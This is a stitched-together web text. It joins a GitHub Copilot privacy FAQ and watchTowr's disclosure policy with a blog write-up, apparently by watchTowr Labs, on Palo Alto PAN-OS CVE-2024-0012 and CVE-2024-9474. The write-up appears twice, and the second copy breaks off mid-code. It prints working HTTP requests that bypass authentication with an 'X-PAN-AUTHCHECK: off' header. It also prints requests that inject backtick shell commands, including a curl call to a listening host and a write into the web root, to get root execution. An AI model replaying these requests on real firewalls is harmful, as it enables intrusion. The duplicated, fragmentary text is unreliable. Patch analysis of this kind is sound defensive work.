* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHubâs model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHubâs Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHubâs retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those featuresâ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EUâs General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilotâs suggestions (in rare instances) may resemble the code its model was trained on. Hereâs some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:Â  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilotâs AI model was trained with the use of code from GitHubâs public repositoriesâwhich are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHubâs research), suggestions from GitHub may match examples of code used to train GitHubâs AI model. Again, Copilot does not âlook upâ or âcopy and pasteâ code, but is instead using context from a userâs workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilotâs model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If thereâs a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositoriesâincluding ones without licensesâthat code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We donât determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered âfunctionalâ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years weâve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. Itâs not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called âCopilotâ not âAutopilotâ and itâs not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilotâs suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses â rigorous functionality testing, code scanning, security testing, etc. â you should continue these policies with Copilotâs suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* Youâre entitled to IP indemnification from GitHub for the unmodified suggestions when Copilotâs filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

# Vulnerability Disclosure Policy

At [**watchTowr**](https://www.watchtowr.com/?ref=labs.watchtowr.com), we take our responsibility of identifying and reporting security vulnerabilities seriously. We believe that security vulnerabilities should be disclosed to vendors. To that end, we have developed the following Vulnerability Disclosure Policy (VDP).

At [**watchTowr**](https://www.watchtowr.com/?ref=labs.watchtowr.com), we proactively audit security-critical codebases which we notice our clients rely on. This feeds our ability to keep external attack surfaces secure via the [**watchTowr Platform**](https://www.watchtowr.com/?ref=labs.watchtowr.com), as we can find and fix vulnerabilities before exploitation can affect our clients.

Typically, during these audits, we are concerned with high-impact, 'world-ending' vulnerabilities, but often we notice smaller bugs which have limited impact, or even those which have no impact at all but severely weaken the general security posture of a codebase. Usually in these case, we work with the software vendor to have these bugs fixed to support strength within a codebase.

This policy applies to all security vulnerabilities that we discover in products or services offered by vendors. These vendors may include SaaS platforms, cloud providers, COTS software vendors, security appliance vendors and more.

## Disclosure Process

When we identify a security vulnerability, we will follow the following process:

1. Notify the vendor: We will make a good faith effort to contact the vendor as soon as possible after discovering the vulnerability. We will send an email to the vendor's security contact or a designated point of contact. The email will describe the vulnerability and provide sufficient detail to allow the vendor to reproduce and verify the issue. We will also provide a timeline for disclosure and request confirmation of receipt.
2. Notify our clients: We make a good faith effort to notify our clients of their potential exposure, so that proactive mitigations can be implemented.
3. Allow the vendor 90 days to respond: We believe that vendors should have sufficient time to investigate and address the vulnerability. Therefore, we will wait for a period of 90 days before disclosing the vulnerability publicly. If the vendor needs more time, we will work with them to establish a new timeline.
4. Coordinate with the vendor on disclosure: If the vendor confirms the vulnerability, we will work with them to determine an appropriate timeline for public disclosure. We will make a good faith effort to provide the vendor with a reasonable amount of time to develop and release a patch before we publicly disclose the vulnerability.
5. Public disclosure: If the vendor fails to respond or does not address the vulnerability within the agreed timeline, we will make a public disclosure of the vulnerability. We will also include a summary of our efforts to contact the vendor and the timeline of our disclosure process.

We believe that disclosure is important, and we will work with vendors to ensure that their users are not put at risk by the disclosure of a vulnerability. We will not disclose any vulnerability that we believe could be used to harm users or that could be exploited before the vendor has had a reasonable amount of time to address the issue.

**However, we (watchTowr) reserve the right, if we believe it is in the best interest of users or the vendor/target of our report is not acting in good faith, to deviate from this 90-day policy and disclose in a manner that we deem appropriate.**

**It should be noted that VDPs are not bound or regulated by legislation, and thus we act within our own ethical and moral standards - towards our clients and the wider community.**

We conduct all vulnerability research in compliance with applicable laws and regulations. We will not engage in any activity that violates the law or the rights of others.

We believe that this Vulnerability Disclosure Policy will help ensure that vendors are notified of security vulnerabilities in a responsible manner and that their users are protected from potential harm.

# Pots and Pans, AKA an SSLVPN - Palo Alto PAN-OS CVE-2024-0012 and CVE-2024-9474

![Pots and Pans, AKA an SSLVPN - Palo Alto PAN-OS CVE-2024-0012 and CVE-2024-9474](/content/images/size/w1200/2024/11/palo-alto-1.png)

It'll be no surprise that 2024, 2023, 2022, and every other year of humanities' existence has been tough for SSLVPN appliances.

Anyhow, there are new vulnerabilities (well, two of them) that are being exploited in the Palo Alto Networks firewall and SSLVPN offering, and as ever, weâre here to locate it.

Here's a quick teaser of what we achieved to whet your appetite:

![](https://labs.watchtowr.com/content/images/2024/11/image-37.png)

Yep! Command injection! Every attacker's favourite vulnerability class, allowing for simple and easy exploitation (once you know how).

As I'm sure you can imagine, analysing vulnerabilities under active exploitation is more than a requirement here at watchTowr, its a passion, and a calling. We're no stranger to Palo Alto Network (Palo Alto from here on, because typing) devices - longtime readers will remember when we raced to analyse CVE-2024-3400 [earlier this year](https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/).

Over the last few weeks, weâve been closely monitoring a new vulnerability, teased at various different phases. It started off as an âinformational disclosureâ, a whiff of a rumour of a critical vulnerability, the only public detail that it was reachable from the deviceâs management interface.

Kudos to Palo Alto for warning its customers of a potential vulnerability before confirming it, and releasing patches as soon as possible. The general security posture of the device is such that mitigations were in place to restrict access to the management interface via a strict ruleset of IP whitelisting.

After a while, the rumour turned into an incremental advisory, arriving complete with indicators of compromise (such as IP addresses and webshell hashes), and then the âbomb droppedâ on Monday when the official advisories for [CVE-2024-0012](https://security.paloaltonetworks.com/CVE-2024-0012?ref=labs.watchtowr.com) and [**CVE-2024-9474**](https://security.paloaltonetworks.com/CVE-2024-9474?ref=labs.watchtowr.com) were announced.

This is a pair of vulnerabilities, described as âAuthentication Bypass in the Management Web Interfaceâ and a âPrivilege Escalationâ respectively, strongly suggesting they are used as a chain to gain superuser access, a pattern that weâve seen before with Palo Alto appliances. Before weâve even dived into to code, weâve already ascertained that weâre looking for a chain of vulnerabilities to achieve that coveted pre-authenticated Remote Code Execution.

With the patches released, it is time to go diffing for that gold! By looking at a pre-patched `10.2.12-h1` and a patched `10.2.12-h2` of âPalo Alto VM-Series Next-Gen Virtual Firewall w/Advanced Threat Prevention.â

We wonât go through jailbreaking the appliance - this has been covered in detail by various sources, so weâre just going to assume that a motivated reader has already performed this step.

Instead, we start our journey by learning the structure and flow of data within the applianceâs management interface. Buckle up as we relay what weâve learned.

The main application is of the *absolutely stellar* PHP language, and is served by an Apache server, fronted by an Nginx reverse proxy.

The server itself is rife with PHP scripts, residing within the `/var/appweb/htdocs/` directory. However, when accessing these scripts from a web browser, weâre met with a redirect to the login page (hardly unsurprising).

We spent quite some time looking through the Nginx config, Apache config, and the PHP scripts themselves to figure out why this was happening, and after a lot of effort we discovered the entry point to the PHP application is actually intended to be another, *totally different* PHP script.

Take a look at this gem of a hack in the `php.ini` file:

```
auto_prepend_file = uiEnvSetup.php ; PAN-MODIFIED

```

We guess `auto_prepend_file` actually has legitimate use besides writing PHP exploits. Anyway, if we look through the `uiEnvSetup.php` file, we can see the script thatâs performing the redirect:

```
if (
    $_SERVER['HTTP_X_PAN_AUTHCHECK'] != 'off'
    && $_SERVER['PHP_SELF'] !== '/CA/ocsp'
    &&  $_SERVER['PHP_SELF'] !== '/php/login.php'
    && stristr($_SERVER['REMOTE_HOST'], '127.0.0.1') === false
) {
    $_SERVER['PAN_SESSION_READONLY'] = true;
    $ws = WebSession::getInstance($ioc);
    $ws->start();
    $ws->close();
    // these are horrible hacks.
    // This whole code should be removed and only make available to a few pages: main, debug, etc.
    if (
        !Str::startsWith($_SERVER['PHP_SELF'], '/php-packages/panorama_webui/php/api/index.php')
        && !Str::startsWith($_SERVER['PHP_SELF'], '/php-packages/firewall_webui/php/api/index.php')
    ) {
        if (Backend::quickSessionExpiredCheck()) {
            if (isset($_SERVER['QUERY_STRING'])) {
                Util::login($_SERVER['QUERY_STRING']);
            } else {
                Util::login();
            }
            exit(1);
        }
    }
}

```

As you can see above, we present to you an example of PAN-OS's management interface auth boundary - the check that compares the HTTP header `HTTP_X_PAN_AUTHCHECK` with the ASCII value `off`.

Initially, on seeing this code, we took the world for what it is and thought - perhaps we could just specify `X-Pan-Authcheck: off` in our requests to disable authentication entirely - but, as ever, life is not that simple. Our requests still resulted in a login page - clearly, not what we want.

After some more digging, we found that the `X-Pan-Authcheck` header is set by default to `on` via the `/etc/nginx/conf/proxy_default.conf` file:

```
# default proxy request header setting
proxy_set_header Host $host;
proxy_set_header X-Real-IP $remote_addr;
proxy_set_header X-Real-Scheme $scheme;
proxy_set_header X-Real-Port $server_port;
proxy_set_header X-Real-Server-IP $server_addr;
proxy_set_header X-Forwarded-For  $proxy_add_x_forwarded_for;
proxy_set_header X-pan-ndpp-mode $pan_ndpp_mode;
proxy_set_header Proxy "";
proxy_set_header X-pan-AuthCheck $panAuthCheck;
proxy_max_temp_file_size 0;

```

This configuration file is included in the primary Nginx file - but, there is a mistake. More later.

Throughout the Nginx configuration, the value of $panAuthCheck is toggled based on the routes being called.

For example, the `/unauth/` dir, which (as youâd expect) requires no auth, is handled like this:

```
if ($uri ~ ^\\/unauth\\/.+$) {
  set $panAuthCheck 'off';
}
```

Looked fun, but - why read, when you can continue to diff?

Fortunately, there is only a small variation change between `10.2.12-h1` and `10.2.12-h2` , only a 5MB difference in size - how hard could it be?

Like most diffing adventures, we mounted the `vdmk`'s to an Ubuntu instance and extracted the whole file system; after hours of looking, mysteriously, no difference could be discovered.

Not accepting the possibility that the patch was somehow invisible to the naked eye, we had an idea. Having spent some time recently diving through FortiManagerâs file system, which holds the root filesystem in memory, as opposed to on disk, we thought - could it be Palo Alto have a similar setup, but with their patch process? Could it be that the patch is applied at boot-time, every time the appliance is started?

After booting up each respective version and jailbreaking them, we began painfully extracting the file system using SCP.

Whilst there was no significant change, there was enough to get our noses pointing in the direction.

# Phase 1 - Authentication Bypass - CVE-2024-0012

Looking at the primary Nginx route configuration - `/etc/nginx/conf/locations.conf` - revealed quite a limited (yet impactful) change:

```
add_header Allow "GET, HEAD, POST, PUT, DELETE, OPTIONS";
 if ($request_method !~ ^(GET|HEAD|POST|PUT|DELETE|OPTIONS)$) {
   return 405;
 }

+  include conf/proxy_default.conf;
   proxy_pass http://$gohost$gohostExt;
 }

```

While it doesnât look like much, thereâs enough here to deduce the entry point to CVE-2024-0012.

What does this tell us? Well, two vital things.

Firstly, we can see that a bunch of request headers are now being set before any definitions of routes or processing takes place, where they weren't - most importantly, this `X-pan-AuthCheck` value that controls authentication is now being set to `on` by default before any route handling is defined.

Secondly, we can see that `conf/proxy_default.conf` (where default headers are also set, including X-pan-AuthCheck) has been added to the handler for `.js.map` URIs - where before this was set later.

Doing some quick deductions, it looks like the authentication header wasnât correctly set by Nginx previously within this directive in previous unpatched versions - could this allow us to abuse the proxypass declaration to send requests that did not have the HTTP request header X-pan-Authcheck configured, to supposedly 'protected' endpoints?

Leveraging our knowledge of Nginx proxypass abuse cases, we pondered about the state of enterprise-grade security appliances that everyone trusts to secure their communications and internal networks - and blasted variations to see if any would allow us through, for example:

```
/php/ztp_gate.php%3f.js.map
/php/ztp_gate.php?.js.map
/php/ztp_gate.php#.js.map
/php/ztp_gate.php/.js.map

```

None of which worked:

```
GET /php/ztp_gate.php/.js.map HTTP/1.1
Host: 18.142.51.124

HTTP/1.1 302 Found
Date: Tue, 19 Nov 2024 10:04:27 GMT

Pragma: no-cache
Location: /php/login.php?
Cache-Control: no-cache; no-store
```

We were somewhat glum, until a bright light came on over our heads.

The `uiEnvSetup.php` script expects the `HTTP_X_PAN_AUTHCHECK` value to be set to `off`, something that was blocked by Nginx previously. Maybe we can just supply it?

Slightly more enlightened - we tried again:

```
GET /php/ztp_gate.php/.js.map HTTP/1.1
Host: {{Hostname}}
X-PAN-AUTHCHECK: off

```

We simplyâ¦ supply the `off` value to the `X-PAN-AUTHCHECK` HTTP request header, and the server helpfully turns off authentication?! At this point, why is anyone surprised?

Thatâs right folks, a simple reproducer for **CVE-2024-0012.** It couldn't be easier than that.

On to phase 2, the privesc vulnerability!

# Phase 2 - Privilege Escalation - CVE-2024-9474

#

Now the floodgates are open, and there is all sorts of post-authentication PHP functionality now within our grasp. Typically from this point, itâs down to our creativity to find the next step to RCE.

Letâs take a look at what the threat actors found by continuing our diff.

One file that stood out to us like a sore thumb was the change in `/var/appweb/htdocs/php-packages/panui_core/src/log/AuditLog.php` , which reveals a quite honest command injection:

```
<?php

namespace panui_core\log;

use pan_core\InjectableClass;
use pan_process\Process;
use pan_process\ShellSanitizer;

class AuditLog extends InjectableClass
{
  public function write($username, $message) {
    /** @var ShellSanitizer */
    $s = $this->ioc->get(ShellSanitizer::class);
    $msg = $s->escapeshellarg($message);

    /** @var Process */
    $p = $this->ioc->get(Process::class);
-    return $p->pexecute("/usr/local/bin/pan_elog -u audit -m $msg -o $username");
+    $u = $s->escapeshellarg($username);
+    return $p->pexecute("/usr/local/bin/pan_elog -u audit -m $msg -o $u");
  }
}
```

It couldnât be more straightforward than this.

Somehow a user is able to pass a username containing shell metacharacters into the `AuditLog.write()` function, which then passes its value to `pexecute()` .

Looking at other changes, we discovered a file with quite a large change - `/var/appweb/htdocs/php/utils/createRemoteAppwebSession.php`.

```
<?php

WebSession::start();

/** @noinspection PhpUndefinedFunctionInspection */
$isCms = panui_platform_is_cms();
if ($isCms == 0) {
    // create a remote appweb session only on a device

    $locale = isset($_POST['locale']) ? $_POST['locale'] : $_SESSION['locale'];
+    $user = $_POST['user'];
+    $userRole = $_POST['userRole'];
+    $remoteHost = $_POST['remoteHost'];
+    $vsys = $_POST['vsys'];
+    $editShared = $_POST['editShared'];
+    $protocol = $_POST['prot'];
+    $serverPort = $_SERVER['SERVER_PORT'];
+    $rbaXml = $_POST['rbaxml'];
+    $hideHeaderBg = $_POST['hideHeaderBg'];
+    if (strlen($user) <= 63

> Before we go further, our understanding for this functionality is a little insane.

> **Our understanding** is that this functionality is for users of Palo Alto Panorama to effectively 'jump into' connected SSLVPN/firewall devices - as you can see above though, with no actual authentication (i.e. valid password) required. This functionality allows a Palo Alto Panorma device to specify the user, user role and more that they would like to impersonate - and in a very friendly way, be provided with a fully authenticated, 2FA-not-required, valid PHP session ID.

When first looking at this, it's quite clear the functionality appears to be creating a PHP session - for a seemingly arbitrary user, and seemingly arbitrary role - based on the values of POST parameters passed in the HTTP request received.

For a second, we were thrown off by the introduced length checks - was this about to become some unusual memory corruption vulnerability? And then we chuckled, because never has anything remotely looking like complexity been needed with an appliance.

Our theory was simple - the value being passed via the 'user' parameter was likely going into $\_SESSION['userName'] that as we saw above was the source of what looked like a patch for a command injection vulnerability.

Fret not - we decided to proceed and created a valid HTTP request, using our aforementioned auth bypass, and an HTTP post parameter value for the 'user' key containing a simple `curl` command to our external listening host:

```
POST /php/utils/createRemoteAppwebSession.php/aaaa.js.map HTTP/1.1
Host: {{Hostname}}
X-PAN-AUTHCHECK: off
Content-Type: application/x-www-form-urlencoded
Content-Length: 99

user=`curl {{listening-host}}`&userRole=superuser&remoteHost=&vsys=vsys1

```

This returns us a nice PHP session ID value:

```
HTTP/1.1 200 OK
Date: Tue, 19 Nov 2024 09:06:44 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 48
Connection: keep-alive

Pragma: no-cache
Cache-Control: no-cache; no-store

@start@PHPSESSID=isbhbjpdkhvmkhio0hcpsgmtk6@end@

```

A quick look at the file system shows our payload is sitting tight within the sessionâs contents, and as expected, in the 'userName' key (i.e. $\_SESSION['userName']):

```
[root@PA-VM /]# cat ./opt/pancfg/mgmt/phpsessions/sess_isbhbjpdkhvmkhio0hcpsgmtk6
cmsRemoteSession|s:1:"1";panorama_sessionid|s:5:"dummy";user|s:16:"XXXX";userName|s:52:"`curl {{listening-host}}`";userRole|s:9:"superuser"

```

Weâd like to be honest here and give the complete trace down of where this vulnerability actually is, source-to-sink but, well, sometimes you just need to use a sledgehammer instead of tweezers.

With our payload injected into the correct location, we set out to blast all endpoints with our shiny `PHPSESSID` . As the code affected by the command injection was in audit log writing code, we just took a punt and fired our request - with our newly minted and forged PHP session at index.php.

```
GET /index.php/.js.map HTTP/1.1
Host: {{Hostname}}
Cookie: PHPSESSID=2jq4l1nv43idudknmhj830vdde;
X-PAN-AUTHCHECK: off
Connection: keep-alive

```

The command under the hood looks a little like this (thanks **pspy**!):

```
CMD: UID=0     PID=87502  | sh -c export panusername="`curl {{listening-host}}`";export superuser="1";export isxml="yes";/usr/local/bin/sdb -e -n ha.app.local.state

```

Please pause. It's 2024. We've made our point, so we'll say nothing more.

The full chain looks something like this:

```
POST /php/utils/createRemoteAppwebSession.php/watchTowr.js.map HTTP/1.1
Host: {{Hostname}}
X-PAN-AUTHCHECK: off
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

user=`echo $(uname -a) > /var/appweb/htdocs/unauth/watchTowr.php`&userRole=superuser&remoteHost=&vsys=vsys1

```
```
GET /index.php/.js.map HTTP/1.1
Host: {{Hostname}}
Cookie: PHPSESSID=2qe3kouhjdm8317f6vmueh1m8n;
X-PAN-AUTHCHECK: off

```
```

Host: 192.168.1.227
Cookie: PHPSESSID=fvepfik7vrmvdlkns30rgpn1jb;
X-PAN-AUTHCHECK: off
Connection: keep-alive

```

This results in our injected command being executed:

```

Content-Type: text/html; charset=UTF-8

```
### Summary

So, yet another super-duper secure next-generation hardened security appliance popped.

This time itâs due to those pesky backticks, combined with the super-complicated step of simply asking the server not to check our authentication via `X-PAN-AUTHCHECK`.

![](https://labs.watchtowr.com/content/images/2024/11/image-36.png)

Itâs amazing that these two vulnerabilities got into a production appliance, amazingly allowed via the hacked-together mass of shell script invocations that lurk under the hood of a Palo Alto appliance.

Usual readers might be expecting a nice PoC, and while weâd love to provide one, weâre holding off on this one for a week or so to allow administrators time to patch - but instead, weâre releasing a Nuclei template that you can use to check if your hosts are affected [here](https://github.com/watchtowrlabs/palo-alto-panos-cve-2024-0012/tree/main?ref=labs.watchtowr.com).

AtÂ [watchTowr](https://www.watchtowr.com/?ref=labs.watchtowr.com), we believe continuous security testing is the future, enabling the rapid identification of holistic high-impact vulnerabilities that affect your organisation.

It's our job to understand how emerging threats, vulnerabilities, and TTPs affect your organisation.

# Pots and Pans, AKA an SSLVPN - Palo Alto PAN-OS CVE-2024-0012 and CVE-2024-9474

![Pots and Pans, AKA an SSLVPN - Palo Alto PAN-OS CVE-2024-0012 and CVE-2024-9474](/content/images/size/w1200/2024/11/palo-alto-1.png)

It'll be no surprise that 2024, 2023, 2022, and every other year of humanities' existence has been tough for SSLVPN appliances.

Anyhow, there are new vulnerabilities (well, two of them) that are being exploited in the Palo Alto Networks firewall and SSLVPN offering, and as ever, weâre here to locate it.

Here's a quick teaser of what we achieved to whet your appetite:

![](https://labs.watchtowr.com/content/images/2024/11/image-37.png)

Yep! Command injection! Every attacker's favourite vulnerability class, allowing for simple and easy exploitation (once you know how).

As I'm sure you can imagine, analysing vulnerabilities under active exploitation is more than a requirement here at watchTowr, its a passion, and a calling. We're no stranger to Palo Alto Network (Palo Alto from here on, because typing) devices - longtime readers will remember when we raced to analyse CVE-2024-3400 [earlier this year](https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/).

Over the last few weeks, weâve been closely monitoring a new vulnerability, teased at various different phases. It started off as an âinformational disclosureâ, a whiff of a rumour of a critical vulnerability, the only public detail that it was reachable from the deviceâs management interface.

Kudos to Palo Alto for warning its customers of a potential vulnerability before confirming it, and releasing patches as soon as possible. The general security posture of the device is such that mitigations were in place to restrict access to the management interface via a strict ruleset of IP whitelisting.

After a while, the rumour turned into an incremental advisory, arriving complete with indicators of compromise (such as IP addresses and webshell hashes), and then the âbomb droppedâ on Monday when the official advisories for [CVE-2024-0012](https://security.paloaltonetworks.com/CVE-2024-0012?ref=labs.watchtowr.com) and [**CVE-2024-9474**](https://security.paloaltonetworks.com/CVE-2024-9474?ref=labs.watchtowr.com) were announced.

This is a pair of vulnerabilities, described as âAuthentication Bypass in the Management Web Interfaceâ and a âPrivilege Escalationâ respectively, strongly suggesting they are used as a chain to gain superuser access, a pattern that weâve seen before with Palo Alto appliances. Before weâve even dived into to code, weâve already ascertained that weâre looking for a chain of vulnerabilities to achieve that coveted pre-authenticated Remote Code Execution.

With the patches released, it is time to go diffing for that gold! By looking at a pre-patched `10.2.12-h1` and a patched `10.2.12-h2` of âPalo Alto VM-Series Next-Gen Virtual Firewall w/Advanced Threat Prevention.â

We wonât go through jailbreaking the appliance - this has been covered in detail by various sources, so weâre just going to assume that a motivated reader has already performed this step.

Instead, we start our journey by learning the structure and flow of data within the applianceâs management interface. Buckle up as we relay what weâve learned.

The main application is of the *absolutely stellar* PHP language, and is served by an Apache server, fronted by an Nginx reverse proxy.

The server itself is rife with PHP scripts, residing within the `/var/appweb/htdocs/` directory. However, when accessing these scripts from a web browser, weâre met with a redirect to the login page (hardly unsurprising).

We spent quite some time looking through the Nginx config, Apache config, and the PHP scripts themselves to figure out why this was happening, and after a lot of effort we discovered the entry point to the PHP application is actually intended to be another, *totally different* PHP script.

Take a look at this gem of a hack in the `php.ini` file:

```
auto_prepend_file = uiEnvSetup.php ; PAN-MODIFIED

```

We guess `auto_prepend_file` actually has legitimate use besides writing PHP exploits. Anyway, if we look through the `uiEnvSetup.php` file, we can see the script thatâs performing the redirect:

```
if (
    $_SERVER['HTTP_X_PAN_AUTHCHECK'] != 'off'
    && $_SERVER['PHP_SELF'] !== '/CA/ocsp'
    &&  $_SERVER['PHP_SELF'] !== '/php/login.php'
    && stristr($_SERVER['REMOTE_HOST'], '127.0.0.1') === false
) {
    $_SERVER['PAN_SESSION_READONLY'] = true;
    $ws = WebSession::getInstance($ioc);
    $ws->start();
    $ws->close();
    // these are horrible hacks.
    // This whole code should be removed and only make available to a few pages: main, debug, etc.
    if (
        !Str::startsWith($_SERVER['PHP_SELF'], '/php-packages/panorama_webui/php/api/index.php')
        && !Str::startsWith($_SERVER['PHP_SELF'], '/php-packages/firewall_webui/php/api/index.php')
    ) {
        if (Backend::quickSessionExpiredCheck()) {
            if (isset($_SERVER['QUERY_STRING'])) {
